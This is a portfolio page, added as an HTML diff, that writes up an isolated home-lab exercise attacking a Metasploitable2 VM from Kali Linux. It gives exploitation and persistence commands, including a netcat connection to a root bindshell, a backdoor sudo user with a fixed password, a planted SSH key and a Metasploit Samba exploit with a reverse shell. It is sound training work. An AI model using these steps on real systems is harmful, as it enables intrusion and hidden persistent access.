@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Metasploit & Kali Linux — Exploitation Lab — Mark Dale Elroy Bagui</title>
+
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="ambient">
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+</div>
+<div class="noise"></div>
+
+<!-- ===================== NAV ===================== -->
+<nav>
+  <div class="nav-inner">
+    <a href="../index.html">Mark Dale Elroy Bagui</a>
+    <div>
+      <a href="../index.html#projects" class="back-link">← Back to Portfolio</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+
+  <!-- ===================== BREADCRUMB + TITLE ===================== -->
+  <div class="breadcrumb">
+    <a href="../index.html">Portfolio</a> /
+    <a href="../index.html#projects">Projects</a> /
+    Metasploit & Kali Linux Exploitation Lab
+  </div>
+
+  <div class="title-row">
+    <h1>Metasploitable2 Exploitation Lab with Kali Linux</h1>
+    <span class="badge">Home Lab</span>
+  </div>
+
+  <div class="tags">
+    <span class="badge">🐉 Kali Linux</span>
+    <span class="badge">🎯 Metasploitable2</span>
+    <span class="badge">🛠️ Metasploit Framework</span>
+    <span class="badge">🔎 Nmap</span>
+  </div>
+
+  <p class="subtitle">
+    An isolated home lab pairing Kali Linux (attacker) against Metasploitable2 (intentionally vulnerable target) to practice reconnaissance, exploitation, and post-exploitation techniques — reconnaissance with Nmap, exploiting a wide-open root shell, planting persistence, and gaining root access via a real Metasploit module against Samba.
+  </p>
+
+  <div class="callout">
+    ⚠️ <strong>Scope note:</strong> Metasploitable2 is an intentionally vulnerable virtual machine built by Rapid7 specifically for practicing exploitation techniques in an isolated lab. Every step below was performed against this training target only, on a host-only/internal network with no route to production or the internet.
+  </div>
+
+  <!-- ===================== 1. LAB SETUP ===================== -->
+  <div class="section">
+    <h2><span class="step-label">1</span>Lab Environment Setup</h2>
+    <p>Installed Metasploitable2 and Kali Linux as virtual machines on the same isolated host-only network — Kali as the attacker box, Metasploitable2 as the intentionally vulnerable target.</p>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/metasploit_dashboard.png" alt="Metasploitable2 VM running in VirtualBox" onclick="openLightbox('img_meta/metasploit_dashboard.png')"></div>
+        <div class="img-caption">Metasploitable2 booted and running in Oracle VirtualBox</div>
+      </div>
+    </div>
+
+    <div class="value-block">
+      <span class="label">Metasploitable2 IP:</span> 192.168.56.101 &nbsp; | &nbsp; <span class="label">Kali Linux IP:</span> 192.168.56.104
+    </div>
+
+    <div class="img-grid">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/ip_meta.png" alt="ifconfig output on Metasploitable2 showing 192.168.56.101" onclick="openLightbox('img_meta/ip_meta.png')"></div>
+        <div class="img-caption">ifconfig on Metasploitable2 — 192.168.56.101</div>
+      </div>
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/ip_kali.png" alt="ifconfig output on Kali Linux showing 192.168.56.104" onclick="openLightbox('img_meta/ip_kali.png')"></div>
+        <div class="img-caption">ifconfig on Kali Linux — 192.168.56.104</div>
+      </div>
+    </div>
+
+    <h3>Connectivity Check</h3>
+    <p>Verified both directions of connectivity before any attack simulation began — a mandatory pre-engagement check to confirm the lab network is isolated from the production home network.</p>
+
+    <div class="img-grid">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/ping_kali.png" alt="Kali Linux pinging Metasploitable2 successfully" onclick="openLightbox('img_meta/ping_kali.png')"></div>
+        <div class="img-caption">Kali → Metasploitable2 — 4 packets transmitted, 0% loss</div>
+      </div>
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/ping_meta.png" alt="Metasploitable2 pinging Kali Linux successfully" onclick="openLightbox('img_meta/ping_meta.png')"></div>
+        <div class="img-caption">Metasploitable2 → Kali — reply received, both hosts reachable</div>
+      </div>
+    </div>
+
+    <div class="callout">
+      💡 <strong>Purpose:</strong> Verify that the penetration testing lab environment is isolated from the production home network before any attack simulation begins. This is a mandatory pre-engagement check.
+    </div>
+  </div>
+
+  <!-- ===================== 2. RECON ===================== -->
+  <div class="section">
+    <h2><span class="step-label">2</span>Reconnaissance with Nmap</h2>
+    <p>Scanned the target with Nmap to enumerate open ports, running services, and the operating system before attempting anything further.</p>
+
+    <table>
+      <tr><th>Flag</th><th>Purpose</th></tr>
+      <tr><td>-sC</td><td>Run default Nmap scripts</td></tr>
+      <tr><td>-sV</td><td>Detect service/version info</td></tr>
+      <tr><td>-p-</td><td>Scan all 65535 ports</td></tr>
+      <tr><td>-oN</td><td>Save output to a file</td></tr>
+      <tr><td>-T4</td><td>Faster scan timing</td></tr>
+      <tr><td>-O</td><td>Attempt OS detection</td></tr>
+    </table>
+
+    <div class="value-block">
+      <span class="label">Command:</span> nmap -sC -sV -p- -oN metasploit.txt -T4 -O 192.168.56.101
+    </div>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/nmap_progress.png" alt="nmap scan starting against 192.168.56.101" onclick="openLightbox('img_meta/nmap_progress.png')"></div>
+        <div class="img-caption">Nmap scan launched against 192.168.56.101</div>
+      </div>
+    </div>
+
+    <p>The scan returned a long list of open ports and services — a hallmark of Metasploitable2's intentionally vulnerable design.</p>
+    <div class="img-grid">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/output_1.png" alt="Nmap scan results showing open ports on Metasploitable2" onclick="openLightbox('img_meta/output_1.png')"></div>
+        <div class="img-caption">Open ports — FTP, SSH, Telnet, SMTP, RPC, and more</div>
+      </div>
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/output_2.png" alt="Nmap scan results showing more open ports and OS detection" onclick="openLightbox('img_meta/output_2.png')"></div>
+        <div class="img-caption">Further open ports, SMB script results, and OS detection</div>
+      </div>
+    </div>
+
+    <div class="callout">
+      🚩 <strong>Critical finding:</strong> Port 1524 was found open, running a bindshell that hands out an unauthenticated root shell to anyone who connects. This is not a vulnerability or misconfiguration — it's a wide-open root shell. On a real engagement, this would be a P0 critical finding: the engagement stops and the client gets a phone call, not an email.
+    </div>
+  </div>
+
+  <!-- ===================== 3. EXPLOITING PORT 1524 ===================== -->
+  <div class="section">
+    <h2><span class="step-label">3</span>Exploiting the Port 1524 Root Shell</h2>
+    <p>Connected directly to the exposed bindshell using netcat — no exploit code or authentication required.</p>
+
+    <div class="value-block">
+      <span class="label">Command:</span> nc 192.168.56.101 1524
+    </div>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/nc.png" alt="Netcat connecting to port 1524 and receiving a root shell" onclick="openLightbox('img_meta/nc.png')"></div>
+        <div class="img-caption">netcat connects to port 1524 — instant root@metasploitable:/#</div>
+      </div>
+    </div>
+
+    <h3>Post-Exploitation Enumeration</h3>
+    <p>Confirmed the shell's privilege level and enumerated local accounts.</p>
+
+    <div class="img-grid">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/capable.png" alt="id command confirming uid=0(root)" onclick="openLightbox('img_meta/capable.png')"></div>
+        <div class="img-caption">id — uid=0(root) gid=0(root) groups=0(root)</div>
+      </div>
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/output_passwd.png" alt="cat /etc/passwd listing all local users" onclick="openLightbox('img_meta/output_passwd.png')"></div>
+        <div class="img-caption">cat /etc/passwd — full local account listing</div>
+      </div>
+    </div>
+
+    <table>
+      <tr><th>Field Order</th><th colspan="6">username : password : uid : gid : comment : home : shell</th></tr>
+    </table>
+
+    <table>
+      <tr><th>Post-Exploitation Goal</th><th>Description</th></tr>
+      <tr><td>PERSISTENCE</td><td>Stay in even after reboot or port closure</td></tr>
+      <tr><td>PILLAGING</td><td>Steal credentials, keys, sensitive data</td></tr>
+      <tr><td>PIVOTING</td><td>Use this machine to reach other machines</td></tr>
+    </table>
+  </div>
+
+  <!-- ===================== 4. PERSISTENCE ===================== -->
+  <div class="section">
+    <h2><span class="step-label">4</span>Establishing Persistence</h2>
+
+    <h3>Persistence 1 — Backdoor User Account</h3>
+    <p>Created a hidden local account that survives the bindshell port being closed — access is retained through standard SSH on port 22 instead.</p>
+
+    <div class="value-block">
+      <span class="label">Commands:</span> useradd -m -s /bin/bash weaker &nbsp;→&nbsp; echo "weaker:Password123" | chpasswd &nbsp;→&nbsp; usermod -aG sudo weaker
+    </div>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/persistence1.png" alt="Creating a backdoor user account with sudo privileges" onclick="openLightbox('img_meta/persistence1.png')"></div>
+        <div class="img-caption">Backdoor user "weaker" created and added to the sudo group</div>
+      </div>
+    </div>
+
+    <h3>Persistence 2 — Planted SSH Key</h3>
+    <p>Generated an SSH keypair on Kali, then planted the public key into the target's <code>authorized_keys</code> file for passwordless root access going forward.</p>
+
+    <div class="img-grid">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/generate.png" alt="ssh-keygen generating a new RSA keypair" onclick="openLightbox('img_meta/generate.png')"></div>
+        <div class="img-caption">ssh-keygen -t rsa — keypair generated on Kali</div>
+      </div>
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/persistence2.png" alt="Public key added to authorized_keys with chmod 600 applied" onclick="openLightbox('img_meta/persistence2.png')"></div>
+        <div class="img-caption">Public key appended to /root/.ssh/authorized_keys, chmod 600 applied</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== 5. FTP ===================== -->
+  <div class="section">
+    <h2><span class="step-label">5</span>File Transfer Protocol (FTP)</h2>
+    <p>Tested anonymous FTP access — entering "anonymous" as the username with a blank password granted a successful login.</p>
+
+    <div class="value-block">
+      <span class="label">Command:</span> ftp 192.168.56.101 &nbsp; | &nbsp; <span class="label">Login:</span> anonymous
+    </div>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/anonymous.png" alt="Anonymous FTP login succeeding on Metasploitable2" onclick="openLightbox('img_meta/anonymous.png')"></div>
+        <div class="img-caption">230 Login successful — anonymous FTP access confirmed</div>
+      </div>
+    </div>
+
+    <h3>Comparing Backdoor Sophistication</h3>
+    <p>Contrasted the two backdoor styles encountered so far, to illustrate why detectability matters as much as impact.</p>
+
+    <table>
+      <tr><th>Backdoor</th><th>Behavior</th></tr>
+      <tr><td>Port 1524 bindshell</td><td>Always open, waiting for anyone → requires zero interaction → detectable by any port scanner → a lazy attacker technique</td></tr>
+      <tr><td>vsftpd backdoor (port 6200)</td><td>Port does not exist until triggered → requires knowing the secret input → a port scan shows nothing on 6200 before the trigger → a sophisticated supply-chain technique</td></tr>
+    </table>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/ftpsmiley.png" alt="Triggering the vsftpd backdoor with a crafted FTP username and connecting to port 6200" onclick="openLightbox('img_meta/ftpsmiley.png')"></div>
+        <div class="img-caption">Triggering the FTP backdoor and connecting to the hidden port 6200 shell</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== 6. SAMBA VIA METASPLOIT ===================== -->
+  <div class="section">
+    <h2><span class="step-label">6</span>Exploiting Samba via Metasploit</h2>
+    <p>Moved from manual exploitation to the Metasploit Framework itself, targeting the outdated Samba 3.0.20 service on port 445.</p>
+
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/msfconsole.png" alt="msfconsole starting up with the Metasploit banner" onclick="openLightbox('img_meta/msfconsole.png')"></div>
+        <div class="img-caption">msfconsole — Metasploit Framework v6.4.116-dev</div>
+      </div>
+    </div>
+
+    <p>Searched for a matching exploit module against the Samba "username map script" vulnerability.</p>
+    <div class="value-block">
+      <span class="label">Command:</span> search samba usermap
+    </div>
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/show_options.png" alt="msfconsole search results showing the samba usermap_script exploit" onclick="openLightbox('img_meta/show_options.png')"></div>
+        <div class="img-caption">exploit/multi/samba/usermap_script — matched and selected</div>
+      </div>
+    </div>
+
+    <p>Reviewed the module's options. Metasploit had already auto-selected <code>cmd/unix/reverse_netcat</code> as the payload — the framework choosing what's known to work against this target.</p>
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/set_hosts.png" alt="show options output listing RHOSTS, RPORT, LHOST, and LPORT" onclick="openLightbox('img_meta/set_hosts.png')"></div>
+        <div class="img-caption">show options — RHOSTS, RPORT 139, LHOST, LPORT 4444</div>
+      </div>
+    </div>
+
+    <div class="value-block">
+      <span class="label">Commands:</span> set RHOSTS 192.168.56.101 &nbsp;→&nbsp; set LHOST 192.168.56.104 &nbsp;→&nbsp; run
+    </div>
+
+    <p>Ran the exploit against the target, sending the reverse shell back to Kali. The exploit succeeded and returned a root shell.</p>
+    <div class="img-grid single">
+      <div class="img-box">
+        <div class="img-frame"><img src="img_meta/gained access.png" alt="Command shell session opened with uid=0(root) confirmed via id and whoami" onclick="openLightbox('img_meta/gained access.png')"></div>
+        <div class="img-caption">Command shell session opened — id confirms uid=0(root), whoami confirms root</div>
+      </div>
+    </div>
+
+    <div class="callout">
+      💡 <strong>Result:</strong> The usermap_script exploit against Samba 3.0.20 succeeded, handing back a fully interactive root shell via a reverse TCP connection to the attacking Kali machine — demonstrating a full exploitation chain from recon to root using the Metasploit Framework.
+    </div>
+  </div>
+
+  <!-- ===================== KEY LEARNINGS ===================== -->
+  <div class="section">
+    <h2><span class="step-label">✓</span>Key Learnings</h2>
+    <ul>
+      <li>Built and validated an isolated attacker/target lab (Kali Linux + Metasploitable2) with a mandatory pre-engagement connectivity check before any exploitation began</li>
+      <li>Performed structured reconnaissance with Nmap (script scans, version detection, full port range, OS fingerprinting) and interpreted the results to prioritize findings</li>
+      <li>Identified and exploited a wide-open root-shell backdoor on port 1524 using nothing but netcat, and explained why it constitutes a critical finding in a real engagement</li>
+      <li>Practiced post-exploitation enumeration (id, /etc/passwd) and organized results using the Persistence / Pillaging / Pivoting framework</li>
+      <li>Implemented two persistence techniques — a backdoor sudo user and a planted SSH key — to demonstrate how attackers retain access after an initial foothold is discovered and closed</li>
+      <li>Compared a "loud" always-open backdoor against a "quiet" trigger-based backdoor (vsftpd on port 6200) to reason about detectability versus sophistication</li>
+      <li>Used the Metasploit Framework end-to-end — searching for a module, reviewing auto-selected payloads, configuring RHOSTS/LHOST, and executing a real exploit (Samba usermap_script) to obtain a root reverse shell</li>
+    </ul>
+  </div>
+
+  <!-- ===================== BOTTOM NAV ===================== -->
+  <div class="bottom-nav">
+    <a href="../index.html#projects" class="btn btn-primary">Back to Projects</a>
+  </div>
+
+</div>
+
+<footer>
+  <div class="wrap" style="display:flex; align-items:center; justify-content:space-between; width:100%; flex-wrap:wrap; gap:10px;">
+    <div class="footer-text">Built with React + Tailwind</div>
+    <div class="footer-text">Last updated: <span class="js-last-updated"></span></div>
+  <script src="../latest.update.js"></script>
+    <div class="footer-text">© 2026 Mark Dale. All rights reserved.</div>
+  </div>
+</footer>
+
+<!-- ===================== LIGHTBOX ===================== -->
+<div class="lightbox-overlay" id="lightboxOverlay" onclick="closeLightbox()">
+  <div class="lightbox-close" onclick="closeLightbox()">✕</div>
+  <img id="lightboxImg" src="" alt="Enlarged view">
+</div>
+
+<script>
+  function openLightbox(src){
+    document.getElementById('lightboxImg').src = src;
+    document.getElementById('lightboxOverlay').classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeLightbox(){
+    document.getElementById('lightboxOverlay').classList.remove('active');
+    document.body.style.overflow = '';
+  }
+  document.addEventListener('keydown', (e) => {
+    if(e.key === 'Escape') closeLightbox();
+  });
+</script>
+
+</body>
+</html>
